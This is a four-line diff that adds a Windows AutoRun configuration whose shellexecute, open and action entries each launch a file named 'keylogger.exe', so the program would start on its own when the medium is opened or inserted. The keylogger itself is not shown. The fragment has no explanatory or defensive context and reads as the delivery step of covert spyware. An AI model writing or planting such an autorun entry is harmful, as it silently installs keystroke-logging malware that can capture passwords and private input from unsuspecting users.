@@ -1,0 +1,4 @@
+[AutoRun]
+shellexecute=keylogger.exe
+open=keylogger.exe
+action=keylogger.exe
